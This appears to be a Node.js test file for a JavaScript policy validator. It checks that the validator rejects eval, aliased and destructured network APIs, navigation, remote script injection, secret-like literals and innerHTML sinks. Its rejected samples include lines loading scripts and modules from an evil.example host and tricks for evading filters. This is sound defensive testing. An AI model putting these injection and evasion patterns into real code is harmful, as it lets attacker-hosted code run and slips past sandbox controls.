import assert from "node:assert/strict";
import test from "node:test";
import { JavaScriptPolicyError, validateJavaScript } from "../scripts/lib/javascript-policy.mjs";
function reject(source,code){assert.throws(()=>validateJavaScript(source,{declaredGlobals:["lucide"]}),(error)=>{assert.ok(error instanceof JavaScriptPolicyError);assert.ok(error.violations.some((item)=>item.code===code),JSON.stringify(error.violations));return true;});}
test("allows local state, DOM interaction, timers, observers and drawing",()=>assert.equal(validateJavaScript(`const state={n:0};document.querySelector('button').addEventListener('click',()=>{state.n++;});setTimeout(()=>requestAnimationFrame(()=>{}),10);new ResizeObserver(()=>{});lucide.createIcons();`).ok,true));
test("rejects dynamic code and dynamic script construction",()=>{for(const source of ["eval('1')","new Function('return 1')","document.createElement('script')","node.setAttribute('src', value)"])reject(source,"js-dynamic-code");});
test("rejects aliased eval, ambiguous element creation and script HTML literals",()=>{for(const source of ["const execute=eval;execute('1')","document.createElement(tagName)",`target.innerHTML='<script src="https://evil.example/x.js"></script>'`])reject(source,"js-dynamic-code");});
test("rejects window escape and navigation",()=>{for(const source of ["window.open('https://x')","top.location='https://x'","parent.postMessage('x','*')","location.assign('https://x')"])reject(source,"js-navigation");});
test("rejects undeclared network APIs",()=>{for(const source of ["fetch('/x')","new XMLHttpRequest()","new WebSocket('wss://x')","navigator.sendBeacon('/x','x')"])reject(source,"js-network");});
test("rejects aliased network APIs and dynamic module loading",()=>{for(const source of ["const request=fetch;request('/x')","const Socket=WebSocket;new Socket('wss://x')","const beacon=navigator.sendBeacon;beacon('/x','x')","import('https://evil.example/x.js')"])reject(source,source.startsWith("import")?"js-dynamic-code":"js-network");});
test("rejects destructured or dynamically addressed sensitive APIs",()=>{
  reject("const {fetch:request}=window;request('/x')","js-network");
  reject("const method='fetch';window[method]('/x')","js-network");
  reject("const w=window;w.open('https://x')","js-navigation");
  reject("const create=document.createElement;create('script')","js-dynamic-code");
});
test("rejects qualified network APIs and nested location writes",()=>{reject("globalThis.fetch('/x')","js-network");reject("window.location.href='https://x'","js-navigation");});
test("rejects resource URL property writes",()=>{reject("image.src='https://evil.example/x.png'","js-network");reject("link.href=value","js-network");});
test("rejects secret-like literals and unsafe HTML sinks",()=>{reject("const token='sk-abcdefghijklmnopqrstuvwxyz123456';","js-secret-literal");reject("target.innerHTML=userInput;","js-unsafe-html-sink");});
test("reports parse failures for CDATA variants",()=>reject("<![CDATA[eval('1')]]>","javascript-parse"));
